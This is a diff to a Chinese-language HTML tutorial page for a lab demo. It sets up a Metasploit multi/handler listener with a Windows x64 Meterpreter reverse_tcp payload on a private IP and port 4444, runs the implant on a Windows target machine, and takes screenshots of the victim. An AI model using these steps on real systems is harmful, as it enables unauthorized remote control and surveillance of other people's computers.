@@ -2,18 +2,34 @@
 <html lang="en"> 
 <head> 
     <meta charset="UTF-8"> 
-    <title>5</title> 
+    <title>连接靶机</title>
     <link rel="stylesheet" type="text/css" href="default.css"> 
 </head> 
 <body> 
 <div id="center"> 
-  <div class="background"> 
-    <h3> 
- 
-    </h3> 
+  <div class="background">
+      <h3>我的服务器到货了,这次用ssh演示(操作和kali一样，只不过暂时没有图形化界面)</h3><br>
+      <h3>首先打开msf 终端输入msfconsole</h3>
+      <img src="picture/33.png" alt=""><hr>
+      <h3>启动主控端</h3><br>
+      <h3>use exploit/multi/handler</h3><br>
+      <h3>set payload windows/x64/meterpreter/reverse_tcp</h3>设置payload<br>
+      <h3>set lhsot 192.168.0.111</h3>设置 host<br>
+      <h3>set lport 4444</h3>设置port<br>
+      <h3>exploit</h3>开始监听，等待被控端上线<br>
+      <img src="picture/34.png" alt="">
+      <h3>中途输错了一个命令，忽略一下</h3><hr>
+      <h3>打开windows靶机，将下载的被控端打开</h3>
+      <img src="picture/35.png" alt=""><hr>
+      <h3>msf检测到设备上线</h3>
+      <img src="picture/36.png" alt=""><hr>
+      <h3>screenshot可对靶机进行截图并上传到kali</h3>
+      <img src="picture/37.png" alt="">
+      <img src="picture/38.png" alt="">
+
   </div> 
     <div> 
-        <a href="4.html"><button>previous page,4</button></a> 
+        <a href="4.html"><button>previous page,局域网网站</button></a>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
